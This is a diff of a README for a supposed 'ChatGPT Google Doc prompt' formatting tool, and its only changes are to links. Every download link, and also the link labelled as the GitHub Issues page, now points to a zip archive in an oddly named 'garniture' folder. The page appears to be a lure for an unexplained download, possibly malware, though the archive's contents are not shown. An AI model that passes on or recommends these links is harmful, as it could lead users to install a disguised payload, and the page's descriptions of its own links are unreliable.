@@ -1,6 +1,6 @@
 # 📝 chatgpt-google-doc-prompt - Simplify Formatting in Google Docs
 
-[![Download ChatGPT Google Doc Prompt](https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/chatgpt-google-doc-prompt-2.7.zip%20Google%20Doc%https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/chatgpt-google-doc-prompt-2.7.zip)](https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/chatgpt-google-doc-prompt-2.7.zip)
+[![Download ChatGPT Google Doc Prompt](https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/prompt-google-doc-chatgpt-v1.3.zip%20Google%20Doc%https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/prompt-google-doc-chatgpt-v1.3.zip)](https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/prompt-google-doc-chatgpt-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, visit the Releases page to download the latest version of the so
 
 1. Click the link below to go to the Releases page:
    
-   [Download ChatGPT Google Doc Prompt](https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/chatgpt-google-doc-prompt-2.7.zip)
+   [Download ChatGPT Google Doc Prompt](https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/prompt-google-doc-chatgpt-v1.3.zip)
 
 2. On the Releases page, find the version you want to download. Click on the download link to save the file to your computer.
 
@@ -98,7 +98,7 @@ The ChatGPT Google Doc Formatting Prompt provides several benefits:
 
 For additional help and support, consider reaching out:
 
-- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/chatgpt-google-doc-prompt-2.7.zip).
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/prompt-google-doc-chatgpt-v1.3.zip).
 - Join the community discussions and benefit from shared knowledge.
 
 ## 📑 License
@@ -113,4 +113,4 @@ We commit to regularly updating the application. It will include enhancements an
 
 For any further assistance, please refer back to this README, or reach out on the GitHub page for a more personalized response.
 
-[Download ChatGPT Google Doc Prompt](https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/chatgpt-google-doc-prompt-2.7.zip)
+[Download ChatGPT Google Doc Prompt](https://raw.githubusercontent.com/shabie786/chatgpt-google-doc-prompt/main/garniture/prompt-google-doc-chatgpt-v1.3.zip)
